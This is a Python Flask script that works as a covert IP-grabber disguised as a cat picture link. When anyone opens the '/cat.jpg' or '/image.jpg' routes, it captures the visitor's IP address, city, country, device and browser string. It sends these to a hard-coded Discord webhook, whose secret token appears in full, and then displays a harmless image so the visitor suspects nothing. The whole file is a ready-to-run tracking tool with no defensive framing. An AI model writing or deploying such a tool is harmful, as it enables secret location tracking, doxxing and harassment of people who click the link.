from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1482020801187418347/TphDuNv5xNun4OFNb49yuEjhx-CzkqrqMb2-R4ypAJ1VBk1pp9-JJqMLd2Q4sAOTHcZD"


def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        return data.get("country", "Unknown"), data.get("city", "Unknown")
    except:
        return "Unknown", "Unknown"


def get_device(user_agent):
    ua = user_agent.lower()

    if "iphone" in ua or "android" in ua:
        return "Phone"
    elif "ipad" in ua or "tablet" in ua:
        return "Tablet"
    else:
        return "PC"


@app.route("/")
@app.route("/cat.jpg")
@app.route("/image.jpg")
def track():

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    time = datetime.now().strftime("%H:%M:%S")

    country, city = get_location(ip)
    device = get_device(user_agent)

    message = f"""
🔔 Link Opened!

🌍 Location: {country}, {city}
📱 Device: {device}
🧠 Browser: {user_agent}
🕒 Time: {time}
🌐 IP: {ip}
"""

    try:
        requests.post(WEBHOOK, json={"content": message})
    except:
        pass

    return '''
<html>
<body style="margin:0;background:black;display:flex;align-items:center;justify-content:center;height:100vh;">
<img src="https://images.unsplash.com/photo-1518791841217-8f162f1e1131" style="max-width:100%;">
</body>
</html>
'''


if __name__ == "__main__":
    app.run()